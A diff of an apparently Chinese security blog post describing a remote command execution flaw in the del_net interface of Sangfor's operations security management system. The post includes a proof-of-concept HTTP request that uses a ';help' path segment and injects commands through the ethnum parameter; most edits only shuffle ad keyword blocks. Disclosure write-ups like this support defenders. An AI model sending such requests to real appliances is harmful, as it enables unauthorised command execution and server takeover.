@@ -7,17 +7,17 @@ asset_dir: assets/深信服运维安全管理系统-del_net-远程命令执行�
 # 深信服运维安全管理系统 del\_net 远程命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2026/3/3 08:35
-- 329浏览
+- 333浏览
 - [0评论](#comment)
 - 6分钟阅读
 
 深入探索
 
-服务器
-
 软件
 
 SQL
+
+服务器
 
 ---
 
@@ -25,7 +25,7 @@ SQL
 
 深信服运维安全管理系统 del\_net 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。
 
-安全工具开发
+安全研究工具
 
 # 影响版本
 
@@ -37,6 +37,14 @@ SQL
 
 # 漏洞分析
 
+深入探索
+
+Docker加速服务
+
+网络安全课程
+
+计算机安全
+
 看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#delNet`的实现逻辑
 
 [![深信服运维安全管理系统 del_net 远程命令执行漏洞](images/img-001-39374e4d6148.webp)](https://image.mrxn.net/3d8e6bacecc7408badd3e2ed5d96381b.webp)
@@ -45,11 +53,11 @@ SQL
 
 深入探索
 
-安全认证考试
+恶意软件分析工具
 
-云安全解决方案
+JSON处理工具
 
-安全运维咨询
+防火墙软件
 
 # 漏洞复现
 
@@ -59,7 +67,7 @@ SQL
 
 > 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
 >
-> 漏洞预警服务
+> 漏洞修复方案
 
 ```
 POST /fort/system;help/netConfig/del_net HTTP/1.1
@@ -68,14 +76,6 @@ Content-Type: application/x-www-form-urlencoded
 
 ethnum=RCE_POC&IPV=255.255.255.1
 ```
-
-深入探索
-
-授权
-
-编程语言教程
-
-Nessus
 
 访问命令执行结果文件
 
